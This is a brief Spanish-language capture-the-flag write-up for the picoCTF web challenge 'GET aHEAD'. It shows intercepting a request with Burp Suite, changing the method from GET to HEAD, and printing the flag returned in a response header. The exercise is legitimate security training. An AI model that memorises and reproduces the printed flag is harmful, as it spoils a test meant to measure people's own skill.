# GET aHEAD
Find the flag being held on this server to get ahead of the competition [http://mercury.picoctf.net:34561/](http://mercury.picoctf.net:34561/)

Hints:
- Maybe you have more than 2 choices
- Check out tools like Burpsuite to modify your requests and look at the responses

## Solución
Se necesitaron de ciertas herramientas y configuración en el navegador (en mi caso FIREFOX)

- Tener deescargado he instalado __Burp Suite Community Edition__.
``` bash
chmod +x burpsuite_community_linux_v2022_8_4.sh

./burpsuite_community_linux_v2022_8_4.sh 
```
- Ir a Configuración de vanevador -> Ajustes, después agregar en el search __network__ y configuramos la conexion, escogemos __condiguración manual de proxy__ y agregamos el proxy HTTP y el puerto.

Usando el Burp interceptamos el Proxy de la página y obtenemos:
``` bash
GET /index.php? HTTP/1.1
Host: mercury.picoctf.net:34561
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://mercury.picoctf.net:34561/index.php
Connection: close
Upgrade-Insecure-Requests: 1
```

Cambiamos el GET por HEAD y damos un forward, vamos a la historial y encontraremos la bandera.

``` bash
HEAD /index.php? HTTP/1.1
Host: mercury.picoctf.net:34561
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://mercury.picoctf.net:34561/index.php
Connection: close
Upgrade-Insecure-Requests: 1
```

``` bash
HTTP/1.1 200 OK
flag: picoCTF{r3j3ct_th3_du4l1ty_8f878508}
Content-type: text/html; charset=UTF-8
```

picoCTF{r3j3ct_th3_du4l1ty_8f878508}